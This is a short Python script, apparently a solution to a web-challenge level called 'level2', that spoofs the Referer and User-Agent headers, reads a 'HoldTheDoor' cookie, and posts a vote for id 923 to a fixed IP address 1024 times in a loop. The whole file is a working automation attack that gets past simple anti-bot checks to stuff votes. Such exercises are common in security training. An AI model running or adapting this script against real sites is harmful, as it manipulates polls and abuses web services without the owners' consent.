#!/usr/bin/python3
import requests

posturl = "http://158.69.76.135/level2.php"

headers = {
    'Referer': 'http://158.69.76.135/level2.php',
    'User-Agent': 'Mozilla/4.01 [en] (Win95; I)'
}

get = requests.get(posturl, headers=headers)

for i in range(1024):
    get = requests.post(
        posturl,
        data={'id': '923',
              'holdthedoor': 'Submit',
              'key': get.cookies['HoldTheDoor']},
        cookies=get.cookies,
        headers=headers
    )
